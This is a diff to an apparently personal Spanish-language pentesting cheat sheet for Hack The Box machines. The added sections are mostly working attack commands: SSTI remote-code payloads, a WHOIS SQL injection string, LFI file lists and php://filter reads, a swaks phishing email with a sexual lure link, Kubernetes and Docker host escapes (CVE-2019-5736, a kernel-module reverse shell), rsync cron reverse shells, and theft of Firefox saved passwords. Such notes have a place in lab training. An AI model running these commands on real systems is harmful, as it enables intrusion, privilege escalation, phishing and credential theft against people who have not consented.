@@ -28,6 +28,8 @@
 				gobuster vhost -u http://$machine.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/file.txt -t 100<br>
 				gobuster dns -d $machine.htb -w /usr/share/wordlists/seclists/Discovery/DNS/file.txt -t 100<br>
 			</p>
+			<p>Para fuzzear por un parametro:</p>
+			<p id="code">ffuf -u "http://$machine.htb/shell.php?FUZZ=whoami" -w /$SECLISTS/Discovery/Web-Content/burp-parameters.txt</p>
 		</article>
 		<article>
 			<h2>REVERSE SHELL</h2>
@@ -60,7 +62,16 @@
 		<article>
 			<h2>SI TENGO LFI</h2>
 			<p>Estos son los archivos que deberías buscar si tenes un Local File Inclusion en una máquina Linux:</p>
-			<p id="code">/home/$USER/.ssh/id_rsa<br>/etc/passwd<br>/etc/hosts<br>/proc/self/cmdline</p>
+			<p id="code">/home/$USER/.ssh/id_rsa<br>
+				/etc/passwd<br>
+				/etc/hosts<br>
+				/proc/self/cmdline<br>
+				/proc/net/fib_trie<br>
+				/proc/net/tcp/<br>
+				/proc/sched_debug
+			</p>
+			<p>Si necesito agarrar un archivo .php y se interpreta su codigo, lo podemos agarrar en base64 y decodificarlo en terminal:</p>
+			<p id="code">#file=php://filter/convert.base64-encode/resource=file.php</p>
 		</article>
 		<article>
 			<h2>ARCHIVOS CON PASSWORD</h2>
@@ -83,12 +94,13 @@
 		<article>
 			<h2>PORT FORWARDING Y SOCAT</h2>
 			<p>Muchas veces es necesario tener conexión con un puerto interno el cual no tenemos acceso desde "afuera"</p>
-			<p id="code">ssh $USER@$IP -L 8080:172.17.0.2:8080<br><br>
+			<p id="code">ssh $USER@$IP -L 8080:172.17.0.2:8080<br>
+				ssh $USER@$IP -D 1080 #Colocamos proxy y podemos ver IP's internas con FoxyProxy<br><br>
 				chisel server --reverse --port 1234<br>
 				chisel client $MP:1234 R:8080:127.0.0.1:8080<br><br>
 				chisel server --reverse --port 1234<br>
 				chisel client $MP:1234 R:127.0.0.1:8080:sock5<br><br>
-				socat TCP-LISTEN:7777 stdout #Poner listener
+				socat TCP-LISTEN:7777 stdout #Poner listener<br>
 				socat TCP-LISTEN:1111,fork TCP:$MP:2222 & #Redirigir entrante
 			</p>
 		</article>
@@ -99,6 +111,10 @@
 		</article>
 		<article>
 			<h2>SQUID PROXY (PORT 3128)</h2>
+			<p>El proxy puede tener credenciales y para probarlas podemos hacer:</p>
+			<p id="code">curl --proxy 'http://$user:$pass@$ip:3128' http://127.0.0.1<br>
+				gobuster dir --proxy http://$user:$pass@$ip:3128 -url http://127.0.0.1 -w /$WORDS -b 407 -t 100
+			</p>
 			<p>Para trabajar con esto hay que modificar el file /etc/proxychains.conf y poner al final:"</p>
 			<p id="code">http $IP 3128<br>
 				proxychains -q nmap -sT -Pn -v -n 127.0.0.1<br>
@@ -142,15 +158,17 @@
 			</p>
 		</article>
 		<article>
-			<h2>SNMP</h2>
+			<h2>SNMP (PORT 161)</h2>
 			<p>Para empezar a enumerar el servicio SNMP, necesitamos de un COMMUNITY STRING, vamos a bruteforcearlo</p>
 			<p id="code">onesixtyone $IP -c /$SECLIST/Discovery/SNMP/Common-strings.txt #Dumpea "public"<br>
 				snmpwalk -v2c -c public $IP<br>
-				snmpwalk -v2c -c public $IP -p AddresType #Dumpea IPV6 (beef)<br><br>
-				nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -6 $IPV6 -oG IPV6Ports
+				snmpwalk -v2c -c public $IP IpAddresType #Dumpea IPV6 (beef)<br>
+				nmap -p- --open -sS --min-rate 5000 -vvv -Pn -n -6 $IPV6 -oG IPV6Ports<br><br>
+				snmpbulkwalk -v2c -c public $IP 1 #Va mas rápido y dumpea más información porque el OID default es 2<br>
+				snmpbulkwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects #En una máquina ejecuta un binario solamente
 			</p>
 			<p>Si nos encontramos con un HTTP que es un Python Server o otro proceso que seguramente se corrió en terminal, podemos enumerarlo!</p>
-			<p id="code">snmpwalk -v2c -c public $IP hrSWRunName | grep python #Dumpea "568"
+			<p id="code">snmpwalk -v2c -c public $IP hrSWRunName | grep python #Dumpea "568"<br>
 				snmapwalk -v2c -c public $IP hrSWRunTable | grep "568" #En este caso dumpea creds de Python Server para usar en POPUP LOGIN
 			</p>
 		</article>
@@ -170,13 +188,71 @@
 			</p>
 		</article>
 		<article>
+			<h2>WHOIS (PORT 43)</h2>
+			<p>Para enumerar el servidor de WHOIS, realizamos lo siguiente:</p>
+			<p id="code">whois -h $IP -p 43 "domain.tld"</p>
+			<p>Es posible que ocurra un SQLI asi que podemos enumerar otras bases de datos</p>
+			<p id="code">whois -h $IP -p 43 "a) or 1=1-- -"</p>
+		</article>
+		<article>
+			<h2>IMAP (PORT 143)</h2>
+			<p>Si tenemos correos electronicos, podemos probar enviarles correos con nuestro server para ver si le hacen click</p>
+			<p id="code">swaks --from test@domain.com --to admin@domain.com,admin2@domain.com --body 'Mira la que esta haciendo tu hija http://$YOURIP/atrevida.jpg' --server $IP</p>
+			<p>Una vez que tenemos credenciales para IMAP, podemos ver correos recibidos o enviados</p>
+			<p id="code">rlwrap telnet $IP 143<br>
+				> a1 LOGIN $USER #PASSWORD<br>
+				> a2 LIST "" "*"<br>
+				> a3 EXAMINE "INBOX.Trash"<br>
+				> a4 FETCH 1 BODY[]
+
+			</p>
+		</article>
+		<article>
+			<h2>GLUSTERFS (PORT 24007)</h2>
+			<p>Sirve para archivar folders, los podemos montar asi que:</p>
+			<p id="code">gluster --remote-host=$IP volume list<br>
+				mount -t glusterfs $IP:/vol1 /mnt/temporal
+			</p>
+			<p>Si nos salta un error, lo podemos leer en /var/log/glusterfs/mnt-temporal.log<br>
+				Depende del error, vamos arreglando puede ser por DNS o por SSL, en el ultimo caso necesitamos agarrar el glusterfs.ca, glusterfs.key, glusterfs.pem dentro de /etc/ssl y ponerlo en nuestra maquina dentro de /etc/ssl o /usr/lib/ssl.
+			</p>
+		</article>
+		<article>
+			<h2>KUBERNETES (PORT 2379/2380)</h2>
+			<p>Minikube : Port 8443<br>
+				Kubelet : Port 10000
+			</p>
+			<p id="code">curl -s -X GET "https://$IP:8443" -k | jq #Need creds<br>
+				kubectl -s https://$IP:8443 #Need creds<br>
+				kubeletctl -s $IP pods #Dump Pods<br>
+				kubeletctl -s $IP scan rce #Shows which one is possible to get RCE<br>
+				kubeletctl -s $IP -p $POD -c $POD exec "whoami"<br>
+				kubeletctl -s $IP -p $POD -c $POD exec "bash" #You get an interactive shell
+			</p>
+			<p>Una vez dentro, para enumerar con el comando kubectl, necesitamos los certificados "ca.crt", "namespace" y "token"</p>
+			<p id="code">/run/secrets/kubernetes.io/serviceaccount/$CERTIFICADOS</p>
+			<p>Ahora si enumeramos sin tener credenciales</p>
+			<p id="code">kubectl -s https://$IP:8443 --certificate-authority=ca.crt --token='$TOKEN' get pods<br>
+				kubectl -s https://$IP:8443 --certificate-authority=ca.crt --token='$TOKEN' auth can-i --list<br>
+				kubectl -s https://$IP:8443 --certificate-authority=ca.crt --token='$TOKEN' get pod $POD -o yaml > evil.yaml
+			</p>
+			<p>Si podemos crear un nuevo POD, entonces modificamos el evil.yaml para que ponga toda la maquina HOST dentro de /mnt </p>
+			<p id="code">kubectl -s https://$IP:8443 --certificate-authority=ca.crt --token='$TOKEN' apply -f evil.yaml<br>
+				kubelet -s $IP pods<br>
+				kubelet -s $IP -p $EVIL_POD -c $EVIL_POD exec "bash"
+			</p>
+			<p>En este punto ya podes modificar la /bin/bash real, agarrar la id_rsa de root, agregar to id_rsa.pub a authorized_keys o incluso crear un CronJob con una reverse-shell</p>
+		
+		</article>
+
+		<article>
 			<h2>RSYNC RCE BYPASS Y PRIVILEGE ESCALATION</h2>
 			<p>Si se ejecuta "rsync *.rdb" entonces podemos crear un test.rdb con codigo bash y hacer lo siguiente:</p>
 			<p id="code">touch -- '-e sh test.rdb'</p>
 			<p>De esta forma, ambos arhivos terminan con .rdb y el '-e sh test.rdb' se termina usando como parametro y ejecuta al 'test.rdb' teniendo RCE como el user que ejecuta esta tarea</p>
 			<p>Ahora vamos a usar Rsync para crear un CronJob para obtener reverse shell</p>
 			<p id="code">rsync rsync://$IP/src/etc/passwd passwd #Getea /etc/passwd<br>
-				echo '* * * * * root sh /tmp/reverse.sh > reverse'<br>
+				echo '* * * * * root sh /tmp/reverse.sh' > reverse<br>
 				rsync reverse rsync://$IP/src/etc/cron.d/reverse<br>
 			</p>
 			<p>Hacemos lo mismo para poner un reverse shell en /tmp/revershell.sh</p>
@@ -190,9 +266,114 @@
 			</p>
 		</article>
 		<article>
-			<h2></h2>
+			<h2>GIT IN LINUX</h2>
+			<p>Si encontramos un directorio ".git" al fuzzear:</p>
+			<p id="code">python3 git_dumper.py http://$IP/.git/ output<br>
+				git log<br>
+				git log -p $HASH-ID
+			</p>
+		</article>
+		<article>
+			<h2>AWS IN LINUX</h2>
 			<p></p>
-			<p id="code"></p>
+			<p id="code">aws configure (Nos pide data para conectarnos)<br>
+				aws --endpoint -url=http://cloud.epsilon.htb help<br>
+				aws --endpoint -url=http://cloud.epsilon.htb lambda help<br>
+				aws --endpoint -url=http://cloud.epsilon.htb lambda list-functions | jq<br>
+				aws --endpoint -url=http://cloud.epsilon.htb lambda get-function --function-name=costume_shop_v1 | jq (Nos da información, incluso URL de código en uso)<br>
+			</p>
+			<p>Para crear una funcion en lambda es:</p>
+			<p id="code">aws lambda create-function --endpoint-url="http://$URL/" --function-name 'test' --runtime nodejs10.x --zip-file fileb://test.zip --handler test.handler --role cualquiercosa</p>
+			<p>Antes deberiamos de crear un test.zip con un file.js para que se ejecute, para ejecutar la funcion hay que poner;</p>
+			<p id="code">aws lambda invoke --endpoint-url="http://$URL/" --function-name 'test' output #Dumpea ejecucion del codigo al output file</p>
+		</article>
+		<article>
+			<h2>SSTI</h2>
+			<p>El Server Side Template Injection es una forma de  ganar RCE a través de ver el input del usuario reflejado, Ej: nombre de usuario</p>
+			<p>Si el servidor está usando Python y Flask, es probable que se pueda generar un SSTI, para verificarlo debe colocar como input:</p>
+			<p id="code">{{7*7}} #49 Como output</p>
+			<p>Si pasa el primer check, ahora podemos probar si se refleja el output del comando que queremos</p>
+			<p id="code">{{ self.__init__.__globals__.__builtins__.__import__('os').popen('$COMANDO').read() }}</p>
+			<p>Una vez que se vea el output del comando reflejado, ya es posible intentar recibir una reverse shell tranquilamente</p>
+			<p>Si el servidor está corriendo Java, tambien es posible un STTI, se verifica de la misma forma pero para probar RCE, es el siguiente codigo:</p>
+			<p id="code">{{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /etc/passwd')")()}}</p>
+			<p>Hay varios payloads de SSTI y sirven para bypassear palabras o para otros servidores</p>
+		</article>
+		<article>
+			<h2>SALIENDO DE DOCKER CONTAINER</h2>
+			<p>Estos son comandos para ver los dockers ya existentes e interactuar con ellos</p>
+			<p id="code">docker ps<br>
+				docker images<br>
+				docker exec -it $IMAGEID bash
+			</p>
+			<h3>LA TIPICA</h3>
+			<p>Si podemos crear dockers, entonces podemos crear un docker en donde vamos a ser root y toda la maquina HOST, estaria dentro del folder /mnt asi que tendriamos varias formas de realizar una reverse-shell</p>
+			<p id="code">docker run -v /:/mnt --rm -it $IMAGEID chroot /mnt sh</p>
+			
+			<h3>CVE-2019-5736 RUNC (VERSION 18.09. 2)</h3>
+			<p>Si podemos ejecutar comandos como root dentro de un docker de version 18.09.2 o anterior, podemos reemplazar la /bin/bash del docker para que ejecute comando como root en la máquina REAL</p>
+			<p>Primero descargamos el "main.go" de esta vulnerabilidad, le cambiamos el codigo para que ejecute 'chmod u+s /bin/bash'</p>
+			<p id="code">go build main.go</p>
+			<p>Ponemos el 'main' dentro del docker y lo ejecutamos</p>
+			<p id="code">sudo docker exec -it $IMAGEID /bin/sh</p>
+			<p>Listo, ahora es bash -p y somos root sino tambien pudimos poner una reverse-shell y GG</p>
+
+			<h3>cap_sys_module</h3>
+			<p id="code">capsh --print #Dumpea cap_sys_module, esto es GG</p>
+			<p>Copiamos el reverse_shell.c de <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">Hacktricks</a> y tambien el MakeFile</p>
+			<p id="code">make<br>
+				insmod reverse-shell.ko #GG reverse shell to real machine as real root
+			</p>
+			
+			<h3>Fail in Permissions and Mounting</h3>
+			<p>Is good to know that the docker can have "entrypoint.sh" en la raíz, esto se ejecuta cuando la máquina se inicia/reinicia asi que es posible hacerle la 13 14</p>
+			<p>It can also have a folder shared with a machine so if we write in that folder, the same in the real machine so if we are root and can access as a user in the real machine:</p>
+			<p id="code">$real_user > cp /bin/bash .<br>
+				$root_container > chown root:root bash<br>
+				$root_container > chmod u+s bash<br>
+				$real_user > bash -p<br><br>
+			</p>
+		</article>
+		<article>
+			<h2>TRUCOS EN LINUX</h2>
+			<p>Si no se encuentra el comando which, podemos usar:</p>
+			<p id="code">command -v $COMANDO</p>
+			<p>Si no funciona el comando "netstat"</p>
+			<p id="code">ss -ntlp</p>
+			<p>Para grepear data dentro de algo usando re en Python:</p>
+			<p id="code">re.findall(r'$TEXTO...value="(.*?)"', $STRING)<br>
+				cat index.html | grep -E 'texto(.*?)texto'
+			</p>
+			<p>Para grepear a lo pro con awk</p>
+			<p id="code">awk '{print $2}' #Printea el segundo argumento separado por espacio<br>
+				awk 'NF{print $NF}'FS=":" #Printea ultimo argumento separado por ":"
+			</p>
+			<p>Para crear un enlace simbolico y hacer hijacking si es el caso</p>
+			<p id="code">ln -s -f $PATH-ENLACE $PATH-FROM</p>
+			<p>Para generar una clave privada que pueda ser reemplzada por otra como en un JWT</p>
+			<p id="code">openssl genrsa -out priv.key 2048</p>
+		</article>
+		<article>
+			<h2>ANALYSE BINARY FILE</h2>
+			<p>Podemos usar desde herramientas simples hasta mas complejas</p>
+			<p id="code">strings $BINARIO #Dumpea strings legibles</p>
+			<p>De esta forma vamos a ver mas info a bajo nivel al ejecutar el binario</p>
+			<p id="code">ltrace $BINARIO</p>
+			<p>Con esto vamos a poder analizar el binario mediante funciones:</p>
+			<p id="code">radare2 $BINARIO<br>
+				> afl<br>
+				> pdf @$FUNCION_open read<br>
+				> pdf @$FUNCION_open write
+			</p>
+		</article>
+		<article>
+			<h2>WAYS TO GET PASSWORDS</h2>
+			<p>Una forma que se puede realizar es si el usuario cuenta con el folder .mozilla y denttro de esta es necesario que este el "key4.db" y "logins.json"</p>
+			<p>Nos descargamos el firefox-decrypt.py de GitHub</p>
+			<p id="code">python3 -m  http.server 8000 #Desde la maquina victima dentro de /.mozilla/firefox/<br>
+				wget -r http://$IP:8000/<br>
+				python3 firefox-decrypt.py $FOLDER
+			</p>
 		</article>
 		<article>
 			<h2></h2>
